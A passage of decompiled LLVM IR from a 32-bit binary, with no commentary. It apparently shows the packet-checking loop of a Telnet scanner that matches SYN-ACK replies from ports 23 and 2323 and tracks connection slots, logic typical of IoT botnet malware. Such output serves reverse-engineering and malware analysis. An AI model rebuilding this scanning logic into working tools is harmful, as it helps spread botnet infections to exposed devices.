  %v1_804e195 = trunc i32 %v3_804e191 to i16
  %v7_804e195 = icmp ne i16 %v1_804e195, 5888
  %v10_804e19c = icmp eq i16 %v1_804e195, 4873
  %v1_804e1a1 = icmp eq i1 %v10_804e19c, false
  %or.cond163 = and i1 %v7_804e195, %v1_804e1a1
  br i1 %or.cond163, label %dec_label_pc_804e136, label %dec_label_pc_804e1a3

dec_label_pc_804e1a3:                             ; preds = %dec_label_pc_804e191
  %v1_804e1a3 = add i32 %v0_804e161, 46
  %v2_804e1a3 = inttoptr i32 %v1_804e1a3 to i16*
  %v3_804e1a3 = load i16, i16* %v2_804e1a3, align 2
  %v4_804e1a3 = zext i16 %v3_804e1a3 to i32
  %v6_804e1a3 = and i32 %v3_804e17e, -65536
  %v7_804e1a3 = or i32 %v4_804e1a3, %v6_804e1a3
  store i32 %v7_804e1a3, i32* %eax.global-to-local, align 4
  %v3_804e1a8 = add i32 %v0_804e161, 96
  %v4_804e1a8 = inttoptr i32 %v3_804e1a8 to i16*
  %v5_804e1a8 = load i16, i16* %v4_804e1a8, align 2
  %v16_804e1a8 = icmp eq i16 %v3_804e1a3, %v5_804e1a8
  %v1_804e1ad = icmp eq i1 %v16_804e1a8, false
  br i1 %v1_804e1ad, label %dec_label_pc_804e136, label %dec_label_pc_804e1af

dec_label_pc_804e1af:                             ; preds = %dec_label_pc_804e1a3
  %v1_804e1af = add i32 %v0_804e161, 107
  %v2_804e1af = inttoptr i32 %v1_804e1af to i8*
  %v3_804e1af = load i8, i8* %v2_804e1af, align 1
  %v4_804e1af = zext i8 %v3_804e1af to i32
  %v6_804e1af = and i32 %v7_804e1a3, -256
  %v7_804e1af = or i32 %v4_804e1af, %v6_804e1af
  store i32 %v7_804e1af, i32* %eax.global-to-local, align 4
  %v2_804e1b3 = and i8 %v3_804e1af, 2
  %v3_804e1b3 = icmp eq i8 %v2_804e1b3, 0
  %v2_804e1bb = and i32 %v4_804e1af, 16
  %v3_804e1bb = icmp eq i32 %v2_804e1bb, 0
  %or.cond164 = or i1 %v3_804e1b3, %v3_804e1bb
  br i1 %or.cond164, label %dec_label_pc_804e136, label %dec_label_pc_804e1c3

dec_label_pc_804e1c3:                             ; preds = %dec_label_pc_804e1af
  %v2_804e1c3 = and i32 %v4_804e1af, 4
  %v3_804e1c3 = icmp eq i32 %v2_804e1c3, 0
  %v1_804e1c5 = icmp eq i1 %v3_804e1c3, false
  br i1 %v1_804e1c5, label %dec_label_pc_804e136, label %dec_label_pc_804e1cb

dec_label_pc_804e1cb:                             ; preds = %dec_label_pc_804e1c3
  %tmp309 = urem i8 %v3_804e1af, 2
  %v3_804e1cb = icmp eq i8 %tmp309, 0
  %v1_804e1cd = icmp eq i1 %v3_804e1cb, false
  br i1 %v1_804e1cd, label %dec_label_pc_804e136, label %dec_label_pc_804e1d3

dec_label_pc_804e1d3:                             ; preds = %dec_label_pc_804e1cb
  %v1_804e1d3 = add i32 %v0_804e161, 102
  %v2_804e1d3 = inttoptr i32 %v1_804e1d3 to i32*
  %v3_804e1d3 = load i32, i32* %v2_804e1d3, align 4
  %v1_804e1d7 = trunc i32 %v3_804e1d3 to i16
  %v2_804e1d7 = call i16 @llvm.bswap.i16(i16 %v1_804e1d7)
  %v3_804e1d7 = zext i16 %v2_804e1d7 to i32
  %v1_804e1db = udiv i32 %v3_804e1d3, 65536
  %v2_804e1db = mul nuw i32 %v3_804e1d7, 65536
  %v1_804e1de = trunc i32 %v1_804e1db to i16
  %v2_804e1de = call i16 @llvm.bswap.i16(i16 %v1_804e1de)
  %v3_804e1de = zext i16 %v2_804e1de to i32
  %v6_804e1de = or i32 %v3_804e1de, %v2_804e1db
  store i32 %v6_804e1de, i32* %eax.global-to-local, align 4
  %v1_804e1e2 = add i32 %v6_804e1de, -1
  %v1_804e1e5 = trunc i32 %v1_804e1e2 to i16
  %v2_804e1e5 = call i16 @llvm.bswap.i16(i16 %v1_804e1e5)
  %v3_804e1e5 = zext i16 %v2_804e1e5 to i32
  %v1_804e1e9 = udiv i32 %v1_804e1e2, 65536
  %v2_804e1e9 = mul nuw i32 %v3_804e1e5, 65536
  %v1_804e1ec = trunc i32 %v1_804e1e9 to i16
  %v2_804e1ec = call i16 @llvm.bswap.i16(i16 %v1_804e1ec)
  %v3_804e1ec = zext i16 %v2_804e1ec to i32
  %v6_804e1ec = or i32 %v3_804e1ec, %v2_804e1e9
  store i32 %v6_804e1ec, i32* %edx.global-to-local, align 4
  %v1_804e1f0 = add i32 %v0_804e161, 86
  %v2_804e1f0 = inttoptr i32 %v1_804e1f0 to i32*
  %v3_804e1f0 = load i32, i32* %v2_804e1f0, align 4
  %v15_804e1f0 = icmp eq i32 %v3_804e1f0, %v6_804e1ec
  %v1_804e1f4 = icmp eq i1 %v15_804e1f0, false
  br i1 %v1_804e1f4, label %dec_label_pc_804e136, label %dec_label_pc_804e1fa

dec_label_pc_804e1fa:                             ; preds = %dec_label_pc_804e1d3
  %v0_804e1fa = load i32, i32* @ebx, align 4
  %v1_804e1fa = add i32 %v0_804e1fa, -255
  %v6_804e1fa = sub i32 254, %v0_804e1fa
  %v7_804e1fa = and i32 %v6_804e1fa, %v0_804e1fa
  %v8_804e1fa = icmp slt i32 %v7_804e1fa, 0
  %v9_804e1fa = icmp eq i32 %v1_804e1fa, 0
  %v10_804e1fa = icmp slt i32 %v1_804e1fa, 0
  %v3_804e200 = icmp eq i1 %v10_804e1fa, %v8_804e1fa
  %v4_804e200 = icmp eq i1 %v9_804e1fa, false
  %v5_804e200 = and i1 %v4_804e200, %v3_804e200
  br i1 %v5_804e200, label %dec_label_pc_804e246, label %dec_label_pc_804e202

dec_label_pc_804e202:                             ; preds = %dec_label_pc_804e1fa
  %v0_804e205 = load i32, i32* @global_var_8053178.21, align 8
  store i32 %v0_804e205, i32* %ecx.global-to-local, align 4
  %v2_804e20b = mul i32 %v0_804e1fa, 288
  %v2_804e20e = add i32 %v0_804e205, %v2_804e20b
  store i32 %v2_804e20e, i32* @eax, align 4
  %v1_804e210 = add i32 %v2_804e20e, 12
  %v2_804e210 = inttoptr i32 %v1_804e210 to i32*
  %v3_804e210 = load i32, i32* %v2_804e210, align 4
  %v1_804e213 = add i32 %v2_804e20e, 288
  store i32 %v1_804e213, i32* %ecx.global-to-local, align 4
  %v1_804e219 = icmp eq i32 %v3_804e210, 0
  br i1 %v1_804e219, label %dec_label_pc_804e235, label %dec_label_pc_804e21d

dec_label_pc_804e21d:                             ; preds = %dec_label_pc_804e202, %dec_label_pc_804e226
  %v0_804e226 = phi i32 [ %v1_804e228, %dec_label_pc_804e226 ], [ %v1_804e213, %dec_label_pc_804e202 ]
  %v0_804e21d = phi i32 [ %v1_804e21d, %dec_label_pc_804e226 ], [ %v0_804e1fa, %dec_label_pc_804e202 ]
  %v1_804e21d = add i32 %v0_804e21d, 1
  store i32 %v1_804e21d, i32* @ebx, align 4
  %v6_804e21e = icmp eq i32 %v0_804e21d, 255
  br i1 %v6_804e21e, label %dec_label_pc_804e246, label %dec_label_pc_804e226

dec_label_pc_804e226:                             ; preds = %dec_label_pc_804e21d
  store i32 %v0_804e226, i32* @eax, align 4
  %v1_804e228 = add i32 %v0_804e226, 288
  store i32 %v1_804e228, i32* %ecx.global-to-local, align 4
  %v1_804e22e = add i32 %v0_804e226, 12
  %v2_804e22e = inttoptr i32 %v1_804e22e to i32*
  %v3_804e22e = load i32, i32* %v2_804e22e, align 4
  store i32 %v3_804e22e, i32* @edi, align 4
  %v1_804e231 = icmp eq i32 %v3_804e22e, 0
  %v1_804e233 = icmp eq i1 %v1_804e231, false
  br i1 %v1_804e233, label %dec_label_pc_804e21d, label %dec_label_pc_804e235

dec_label_pc_804e235:                             ; preds = %dec_label_pc_804e226, %dec_label_pc_804e202
  %v1_804e235 = phi i32 [ %v2_804e20e, %dec_label_pc_804e202 ], [ %v0_804e226, %dec_label_pc_804e226 ]
  %v2_804e235 = add i32 %v1_804e235, 16
  %v3_804e235 = inttoptr i32 %v2_804e235 to i32*
  store i32 %v6_804e1ec, i32* %v3_804e235, align 4
  %v0_804e238 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e238 = trunc i32 %v0_804e238 to i16
  %v2_804e238 = load i32, i32* @eax, align 4
  %v3_804e238 = add i32 %v2_804e238, 20
  %v4_804e238 = inttoptr i32 %v3_804e238 to i16*
  store i16 %v1_804e238, i16* %v4_804e238, align 2
  %v0_804e23c = call i32 @function_804d8f0()
  store i32 %v0_804e23c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e136

dec_label_pc_804e246:                             ; preds = %dec_label_pc_804e1fa, %dec_label_pc_804e16c, %dec_label_pc_804e136, %dec_label_pc_804e21d
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804e24f = add i32 %v0_804e161, 36
  %v2_804e24f = inttoptr i32 %v1_804e24f to i32*
  %v3_804e24f = load i32, i32* %v2_804e24f, align 4
  %v4_804e24f = inttoptr i32 %v3_804e24f to i8*
  %v5_804e254 = call i8* @_memset(i8* %v4_804e24f, i32 0, i32 32)
  %v0_804e256 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e256, i32* %ecx.global-to-local, align 4
  %v0_804e258 = load i32, i32* @esp, align 4
  %v1_804e258 = inttoptr i32 %v0_804e258 to i32*
  %v2_804e258 = load i32, i32* %v1_804e258, align 4
  %v3_804e258 = inttoptr i32 %v2_804e258 to i8*
  %v2_804e25c = load i32, i32* %eax.global-to-local, align 4
  %v5_804e25c = call i8* @_memset(i8* %v3_804e258, i32 %v2_804e25c, i32 %v0_804e256)
  %v6_804e25c = ptrtoint i8* %v5_804e25c to i32
  store i32 %v6_804e25c, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804e262 = load i32, i32* @esp, align 4
  %v1_804e262 = add i32 %v0_804e262, 1852
  %v2_804e262 = inttoptr i32 %v1_804e262 to i32*
  store i32 0, i32* %v2_804e262, align 4
  %v0_804e2ad.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2ad

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e2c7
  store i32 %v1_804e2c2, i32* %edx.global-to-local, align 4
  %v1_804e31f = add i32 %v2_804e2bd, 4
  %v2_804e31f = inttoptr i32 %v1_804e31f to i32*
  %v3_804e31f = load i32, i32* %v2_804e31f, align 4
  %v1_804e324 = urem i32 %v3_804e31f, 32
  store i32 %v1_804e324, i32* %eax.global-to-local, align 4
  %v2_804e327 = udiv i32 %v3_804e31f, 32
  store i32 %v2_804e327, i32* %edx.global-to-local, align 4
  %v0_804e32a = load i32, i32* @esp, align 4
  %v2_804e32a = mul nuw nsw i32 %v2_804e327, 4
  br i1 %v9_804e2c2, label %dec_label_pc_804e31f, label %dec_label_pc_804e277

dec_label_pc_804e277:                             ; preds = %dec_label_pc_804e270
  %v3_804e282 = add nuw nsw i32 %v2_804e32a, 1684
  %v4_804e282 = add i32 %v3_804e282, %v0_804e32a
  %v5_804e282 = inttoptr i32 %v4_804e282 to i32*
  %v6_804e282 = load i32, i32* %v5_804e282, align 4
  %v9_804e282 = shl i32 1, %v1_804e324
  %v12_804e282 = or i32 %v6_804e282, %v9_804e282
  store i32 %v12_804e282, i32* %v5_804e282, align 4
  %v0_804e28a = load i32, i32* @ebx, align 4
  %v1_804e28a = add i32 %v0_804e28a, 4
  %v2_804e28a = inttoptr i32 %v1_804e28a to i32*
  %v3_804e28a = load i32, i32* %v2_804e28a, align 4
  store i32 %v3_804e28a, i32* %eax.global-to-local, align 4
  %v0_804e28d = load i32, i32* @edi, align 4
  %v2_804e28d = sub i32 %v0_804e28d, %v3_804e28a
  %v8_804e28d = xor i32 %v0_804e28d, %v3_804e28a
  %v9_804e28d = xor i32 %v2_804e28d, %v0_804e28d
  %v10_804e28d = and i32 %v9_804e28d, %v8_804e28d
  %v11_804e28d = icmp slt i32 %v10_804e28d, 0
  %v13_804e28d = icmp slt i32 %v2_804e28d, 0
  %v2_804e28f = icmp eq i1 %v13_804e28d, %v11_804e28d
  br i1 %v2_804e28f, label %dec_label_pc_804e293, label %dec_label_pc_804e291

dec_label_pc_804e291:                             ; preds = %dec_label_pc_804e277
  store i32 %v3_804e28a, i32* @edi, align 4
  br label %dec_label_pc_804e293

dec_label_pc_804e293:                             ; preds = %dec_label_pc_804e31f, %dec_label_pc_804e313, %dec_label_pc_804e277, %dec_label_pc_804ef6c, %dec_label_pc_804e33d, %dec_label_pc_804e30a, %dec_label_pc_804e291
  %v0_804e293 = load i32, i32* @esp, align 4
  %v1_804e293 = add i32 %v0_804e293, 1852
  %v2_804e293 = inttoptr i32 %v1_804e293 to i32*
  %v3_804e293 = load i32, i32* %v2_804e293, align 4
  %v1_804e29a = add i32 %v3_804e293, 1
  store i32 %v1_804e29a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e29a, i32* %v2_804e293, align 4
  %v0_804e2a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e2a2 = add i32 %v0_804e2a2, -255
  %v6_804e2a2 = sub i32 254, %v0_804e2a2
  %v7_804e2a2 = and i32 %v6_804e2a2, %v0_804e2a2
  %v8_804e2a2 = icmp slt i32 %v7_804e2a2, 0
  %v9_804e2a2 = icmp eq i32 %v1_804e2a2, 0
  %v10_804e2a2 = icmp slt i32 %v1_804e2a2, 0
  %v3_804e2a7 = icmp eq i1 %v10_804e2a2, %v8_804e2a2
  %v4_804e2a7 = icmp eq i1 %v9_804e2a2, false
  %v5_804e2a7 = and i1 %v4_804e2a7, %v3_804e2a7
  br i1 %v5_804e2a7, label %dec_label_pc_804e35f, label %dec_label_pc_804e2ad

dec_label_pc_804e2ad:                             ; preds = %dec_label_pc_804e293, %dec_label_pc_804e246
  %v0_804e2ad = phi i32 [ %v0_804e2a2, %dec_label_pc_804e293 ], [ %v0_804e2ad.pre, %dec_label_pc_804e246 ]
  %v0_804e2b0 = load i32, i32* @global_var_8053178.21, align 8
  store i32 %v0_804e2b0, i32* %eax.global-to-local, align 4
  %v2_804e2b5 = mul i32 %v0_804e2ad, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804e2bd = add i32 %v0_804e2b0, %v2_804e2b5
  store i32 %v2_804e2bd, i32* @ebx, align 4
  %v1_804e2bf = add i32 %v2_804e2bd, 12
  %v2_804e2bf = inttoptr i32 %v1_804e2bf to i32*
  %v3_804e2bf = load i32, i32* %v2_804e2bf, align 4
  store i32 %v3_804e2bf, i32* %edx.global-to-local, align 4
  %v1_804e2c2 = add i32 %v3_804e2bf, -1
  %v5_804e2c2 = icmp eq i32 %v3_804e2bf, 0
  %v9_804e2c2 = icmp eq i32 %v1_804e2c2, 0
  %v2_804e2c5 = or i1 %v5_804e2c2, %v9_804e2c2
  br i1 %v2_804e2c5, label %dec_label_pc_804e313, label %dec_label_pc_804e2c7

dec_label_pc_804e2c7:                             ; preds = %dec_label_pc_804e2ad, %dec_label_pc_804e31b
  %v1_804e2d1 = phi i32 [ 30, %dec_label_pc_804e2ad ], [ 5, %dec_label_pc_804e31b ]
  %v0_804e2c7 = load i32, i32* @global_var_8053130.9, align 16
  store i32 %v0_804e2c7, i32* %eax.global-to-local, align 4
  %v1_804e2cc = add i32 %v2_804e2bd, 8
  %v2_804e2cc = inttoptr i32 %v1_804e2cc to i32*
  %v3_804e2cc = load i32, i32* %v2_804e2cc, align 4
  %v2_804e2cf = sub i32 %v0_804e2c7, %v3_804e2cc
  store i32 %v2_804e2cf, i32* %eax.global-to-local, align 4
  %tmp303 = icmp ugt i32 %v2_804e2cf, %v1_804e2d1
  br i1 %tmp303, label %dec_label_pc_804e2d5, label %dec_label_pc_804e270

dec_label_pc_804e2d5:                             ; preds = %dec_label_pc_804e2c7
  %v0_804e2d5 = load i32, i32* @esp, align 4
  %v1_804e2d8 = add i32 %v2_804e2bd, 4
  %v2_804e2d8 = inttoptr i32 %v1_804e2d8 to i32*
  %v3_804e2d8 = load i32, i32* %v2_804e2d8, align 4
  store i32 %v3_804e2d8, i32* %eax.global-to-local, align 4
  %v2_804e2db = add i32 %v0_804e2d5, -16
  %v3_804e2db = inttoptr i32 %v2_804e2db to i32*
  store i32 %v3_804e2d8, i32* %v3_804e2db, align 4
  %v1_804e2dc = call i32 @function_804fce3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e2dc, i32* %eax.global-to-local, align 4
  %v0_804e2e4 = load i32, i32* @ebx, align 4
  %v1_804e2e4 = add i32 %v0_804e2e4, 4
  %v2_804e2e4 = inttoptr i32 %v1_804e2e4 to i32*
  store i32 -1, i32* %v2_804e2e4, align 4
  %v0_804e2eb = load i32, i32* @ebx, align 4
  %v1_804e2eb = add i32 %v0_804e2eb, 12
  %v2_804e2eb = inttoptr i32 %v1_804e2eb to i32*
  %v3_804e2eb = load i32, i32* %v2_804e2eb, align 4
  %tmp304 = icmp ult i32 %v3_804e2eb, 3
  br i1 %tmp304, label %dec_label_pc_804ef6c, label %dec_label_pc_804e2f5

dec_label_pc_804e2f5:                             ; preds = %dec_label_pc_804e2d5
  %v1_804e2f5 = add i32 %v0_804e2eb, 284
  %v2_804e2f5 = inttoptr i32 %v1_804e2f5 to i8*
  %v3_804e2f5 = load i8, i8* %v2_804e2f5, align 1
  %v4_804e2f5 = zext i8 %v3_804e2f5 to i32
  %v6_804e2f5 = and i32 %v1_804e2dc, -256
  %v7_804e2f5 = or i32 %v4_804e2f5, %v6_804e2f5
  %v1_804e2fb = add i32 %v7_804e2f5, 1
  %v10_804e2fb = trunc i32 %v1_804e2fb to i8
  store i32 %v1_804e2fb, i32* %eax.global-to-local, align 4
  store i8 %v10_804e2fb, i8* %v2_804e2f5, align 1
  %v0_804e302 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e302 = trunc i32 %v0_804e302 to i8
  %v10_804e302 = icmp eq i8 %v1_804e302, 10
  br i1 %v10_804e302, label %dec_label_pc_804ef6c, label %dec_label_pc_804e30a

dec_label_pc_804e30a:                             ; preds = %dec_label_pc_804e2f5
  %v0_804e30a = load i32, i32* @ebx, align 4
  store i32 %v0_804e30a, i32* @eax, align 4
  %v0_804e30c = call i32 @function_804d8f0()
  store i32 %v0_804e30c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e293

dec_label_pc_804e313:                             ; preds = %dec_label_pc_804e2ad
  br i1 %v5_804e2c2, label %dec_label_pc_804e293, label %dec_label_pc_804e31b

dec_label_pc_804e31b:                             ; preds = %dec_label_pc_804e313
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e2c7

dec_label_pc_804e31f:                             ; preds = %dec_label_pc_804e270
  %v3_804e32a = add nuw nsw i32 %v2_804e32a, 1556
  %v4_804e32a = add i32 %v3_804e32a, %v0_804e32a
  %v5_804e32a = inttoptr i32 %v4_804e32a to i32*
  %v6_804e32a = load i32, i32* %v5_804e32a, align 4
  %v9_804e32a = shl i32 1, %v1_804e324
  %v12_804e32a = or i32 %v6_804e32a, %v9_804e32a
  store i32 %v12_804e32a, i32* %v5_804e32a, align 4
  %v0_804e332 = load i32, i32* @ebx, align 4
  %v1_804e332 = add i32 %v0_804e332, 4
  %v2_804e332 = inttoptr i32 %v1_804e332 to i32*
  %v3_804e332 = load i32, i32* %v2_804e332, align 4
  store i32 %v3_804e332, i32* %eax.global-to-local, align 4
  %v0_804e335 = load i32, i32* @esi, align 4
  %v2_804e335 = sub i32 %v0_804e335, %v3_804e332
  %v8_804e335 = xor i32 %v0_804e335, %v3_804e332
  %v9_804e335 = xor i32 %v2_804e335, %v0_804e335
  %v10_804e335 = and i32 %v9_804e335, %v8_804e335
  %v11_804e335 = icmp slt i32 %v10_804e335, 0
  %v13_804e335 = icmp slt i32 %v2_804e335, 0
  %v2_804e337 = icmp eq i1 %v13_804e335, %v11_804e335
  br i1 %v2_804e337, label %dec_label_pc_804e293, label %dec_label_pc_804e33d

dec_label_pc_804e33d:                             ; preds = %dec_label_pc_804e31f
  store i32 %v3_804e332, i32* @esi, align 4
  br label %dec_label_pc_804e293

dec_label_pc_804e35f:                             ; preds = %dec_label_pc_804e293
  %v0_804e35f = load i32, i32* @esp, align 4
  %v1_804e35f = add i32 %v0_804e35f, 1844
  %v2_804e35f = inttoptr i32 %v1_804e35f to i32*
  store i32 0, i32* %v2_804e35f, align 4
  %v0_804e36a = load i32, i32* @esp, align 4
  %v1_804e36a = add i32 %v0_804e36a, 1840
  %v2_804e36a = inttoptr i32 %v1_804e36a to i32*
  store i32 1, i32* %v2_804e36a, align 4
  %v0_804e375 = load i32, i32* @esp, align 4
  %v0_804e378 = load i32, i32* @edi, align 4
  %v1_804e378 = load i32, i32* @esi, align 4
  %v2_804e378 = sub i32 %v0_804e378, %v1_804e378
  %v8_804e378 = xor i32 %v1_804e378, %v0_804e378
  %v9_804e378 = xor i32 %v2_804e378, %v0_804e378
  %v10_804e378 = and i32 %v9_804e378, %v8_804e378
  %v11_804e378 = icmp slt i32 %v10_804e378, 0
  %v13_804e378 = icmp slt i32 %v2_804e378, 0
  %v1_804e37a = add i32 %v0_804e375, 1840
  %v2_804e381 = add i32 %v0_804e375, -16
  %v3_804e381 = inttoptr i32 %v2_804e381 to i32*
  store i32 %v1_804e37a, i32* %v3_804e381, align 4
  %v1_804e382 = add i32 %v0_804e375, -20
  %v2_804e382 = inttoptr i32 %v1_804e382 to i32*
  store i32 0, i32* %v2_804e382, align 4
  %v1_804e384 = add i32 %v0_804e375, 1556
  store i32 %v1_804e384, i32* %edx.global-to-local, align 4
  %v0_804e38b = load i32, i32* @edi, align 4
  store i32 %v0_804e38b, i32* %eax.global-to-local, align 4
  %v2_804e38d = add i32 %v0_804e375, -24
  %v3_804e38d = inttoptr i32 %v2_804e38d to i32*
  store i32 %v1_804e384, i32* %v3_804e38d, align 4
  %v1_804e38e = add i32 %v0_804e375, 1684
  store i32 %v1_804e38e, i32* %ecx.global-to-local, align 4
  %v2_804e395 = add i32 %v0_804e375, -28
  %v3_804e395 = inttoptr i32 %v2_804e395 to i32*
  store i32 %v1_804e38e, i32* %v3_804e395, align 4
  %v2_804e396 = icmp eq i1 %v13_804e378, %v11_804e378
  br i1 %v2_804e396, label %dec_label_pc_804e35f.dec_label_pc_804e39a_crit_edge, label %dec_label_pc_804e398

dec_label_pc_804e35f.dec_label_pc_804e39a_crit_edge: ; preds = %dec_label_pc_804e35f
  %v0_804e39a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e39a

dec_label_pc_804e398:                             ; preds = %dec_label_pc_804e35f
  %v0_804e398 = load i32, i32* @esi, align 4
  store i32 %v0_804e398, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e39a

dec_label_pc_804e39a:                             ; preds = %dec_label_pc_804e35f.dec_label_pc_804e39a_crit_edge, %dec_label_pc_804e398
  %v0_804e39a = phi i32 [ %v0_804e39a.pre, %dec_label_pc_804e35f.dec_label_pc_804e39a_crit_edge ], [ %v0_804e398, %dec_label_pc_804e398 ]
  %v1_804e39a = add i32 %v0_804e39a, 1
  store i32 %v1_804e39a, i32* %eax.global-to-local, align 4
  %v2_804e39b = add i32 %v0_804e375, -32
  %v3_804e39b = inttoptr i32 %v2_804e39b to i32*
  store i32 %v1_804e39a, i32* %v3_804e39b, align 4
  %v0_804e39c = call i32 @function_804feea()
  store i32 %v0_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* @esp, align 4
  %v1_804e3a4 = add i32 %v0_804e3a1, 16
  %v2_804e3a4 = inttoptr i32 %v1_804e3a4 to i32*
  store i32 0, i32* %v2_804e3a4, align 4
  %v0_804e3a6 = call i32 @function_804ffa4()
  %v0_804e3ab = load i32, i32* @esp, align 4
  %v1_804e3ab = add i32 %v0_804e3ab, 1868
  %v2_804e3ab = inttoptr i32 %v1_804e3ab to i32*
  store i32 0, i32* %v2_804e3ab, align 4
  store i32 %v0_804e3a6, i32* @global_var_8053130.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3dc

dec_label_pc_804e3c2:                             ; preds = %dec_label_pc_804e425.backedge, %dec_label_pc_804e425.preheader, %dec_label_pc_804e3dc, %dec_label_pc_804e8d2, %dec_label_pc_804e40e, %dec_label_pc_804ef8e, %dec_label_pc_804ee89, %dec_label_pc_804e90a
  %v0_804e3c2 = load i32, i32* @esp, align 4
  %v1_804e3c2 = add i32 %v0_804e3c2, 1852
  %v2_804e3c2 = inttoptr i32 %v1_804e3c2 to i32*
  %v3_804e3c2 = load i32, i32* %v2_804e3c2, align 4
  %v1_804e3c9 = add i32 %v3_804e3c2, 1
  store i32 %v1_804e3c9, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3c9, i32* %v2_804e3c2, align 4
  %v0_804e3d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e3d1 = add i32 %v0_804e3d1, -255
  %v6_804e3d1 = sub i32 254, %v0_804e3d1
  %v7_804e3d1 = and i32 %v6_804e3d1, %v0_804e3d1
  %v8_804e3d1 = icmp slt i32 %v7_804e3d1, 0
  %v9_804e3d1 = icmp eq i32 %v1_804e3d1, 0
  %v10_804e3d1 = icmp slt i32 %v1_804e3d1, 0
  %v3_804e3d6 = icmp eq i1 %v10_804e3d1, %v8_804e3d1
  %v4_804e3d6 = icmp eq i1 %v9_804e3d1, false
  %v5_804e3d6 = and i1 %v4_804e3d6, %v3_804e3d6
  br i1 %v5_804e3d6, label %.loopexit, label %dec_label_pc_804e3dc

dec_label_pc_804e3dc:                             ; preds = %dec_label_pc_804e3c2, %dec_label_pc_804e39a
  %v0_804e3dc = phi i32 [ %v0_804e3d1, %dec_label_pc_804e3c2 ], [ 0, %dec_label_pc_804e39a ]
  %v0_804e3df = load i32, i32* @global_var_8053178.21, align 8
  store i32 %v0_804e3df, i32* %eax.global-to-local, align 4
  %v2_804e3e4 = mul i32 %v0_804e3dc, 288
  %v2_804e3e7 = add i32 %v0_804e3df, %v2_804e3e4
  store i32 %v2_804e3e7, i32* @edi, align 4
  %v1_804e3e9 = add i32 %v2_804e3e7, 4
  %v2_804e3e9 = inttoptr i32 %v1_804e3e9 to i32*
  %v3_804e3e9 = load i32, i32* %v2_804e3e9, align 4
  store i32 %v3_804e3e9, i32* %ecx.global-to-local, align 4
  %v10_804e3ec = icmp eq i32 %v3_804e3e9, -1
  br i1 %v10_804e3ec, label %dec_label_pc_804e3c2, label %dec_label_pc_804e3f1

dec_label_pc_804e3f1:                             ; preds = %dec_label_pc_804e3dc
  %v2_804e3f5 = udiv i32 %v3_804e3e9, 32
  store i32 %v2_804e3f5, i32* %edx.global-to-local, align 4
  %v1_804e3f8 = urem i32 %v3_804e3e9, 32
  store i32 %v1_804e3f8, i32* %eax.global-to-local, align 4
  %v0_804e3fb = load i32, i32* @esp, align 4
  %v2_804e3fb = mul nuw nsw i32 %v2_804e3f5, 4
  %v3_804e3fb = add nuw nsw i32 %v2_804e3fb, 1556
  %v4_804e3fb = add i32 %v3_804e3fb, %v0_804e3fb
  %v5_804e3fb = inttoptr i32 %v4_804e3fb to i32*
  %v6_804e3fb = load i32, i32* %v5_804e3fb, align 4
  %v9_804e3fb = shl i32 1, %v1_804e3f8
  %v10_804e3fb = and i32 %v6_804e3fb, %v9_804e3fb
  %v11_804e3fb = icmp ne i32 %v10_804e3fb, 0
  %v1_804e403 = zext i1 %v11_804e3fb to i32
  store i32 %v1_804e403, i32* %eax.global-to-local, align 4
  %v4_804e406 = icmp eq i1 %v11_804e3fb, false
  %v1_804e408 = icmp eq i1 %v4_804e406, false
  br i1 %v1_804e408, label %dec_label_pc_804ede6, label %dec_label_pc_804e40e

dec_label_pc_804e40e:                             ; preds = %dec_label_pc_804e3f1, %dec_label_pc_804ee78
  %v0_804e416 = phi i32 [ %v0_804e3fb, %dec_label_pc_804e3f1 ], [ %v0_804e416.pre, %dec_label_pc_804ee78 ]
  %v0_804e40e = phi i32 [ %v3_804e3e9, %dec_label_pc_804e3f1 ], [ %v0_804e40e.pre, %dec_label_pc_804ee78 ]
  %v2_804e410 = udiv i32 %v0_804e40e, 32
  store i32 %v2_804e410, i32* %ecx.global-to-local, align 4
  %v1_804e413 = urem i32 %v0_804e40e, 32
  store i32 %v1_804e413, i32* %eax.global-to-local, align 4
  %v2_804e416 = mul nuw nsw i32 %v2_804e410, 4
  %v3_804e416 = add i32 %v0_804e416, 1684
  %v4_804e416 = add i32 %v3_804e416, %v2_804e416
  %v5_804e416 = inttoptr i32 %v4_804e416 to i32*
  %v6_804e416 = load i32, i32* %v5_804e416, align 4
  %v9_804e416 = shl i32 1, %v1_804e413
  %v10_804e416 = and i32 %v6_804e416, %v9_804e416
  %v11_804e416 = icmp ne i32 %v10_804e416, 0
  %v1_804e41e = zext i1 %v11_804e416 to i32
  store i32 %v1_804e41e, i32* %eax.global-to-local, align 4
  %v4_804e421 = icmp eq i1 %v11_804e416, false
  br i1 %v4_804e421, label %dec_label_pc_804e3c2, label %dec_label_pc_804e425.preheader

dec_label_pc_804e425.preheader:                   ; preds = %dec_label_pc_804e40e
  %v0_804e42526 = load i32, i32* @edi, align 4
  %v1_804e42527 = add i32 %v0_804e42526, 12
  %v2_804e42528 = inttoptr i32 %v1_804e42527 to i32*
  %v3_804e42529 = load i32, i32* %v2_804e42528, align 4
  store i32 %v3_804e42529, i32* %eax.global-to-local, align 4
  %v1_804e42830 = icmp eq i32 %v3_804e42529, 0
  br i1 %v1_804e42830, label %dec_label_pc_804e3c2, label %dec_label_pc_804e42c

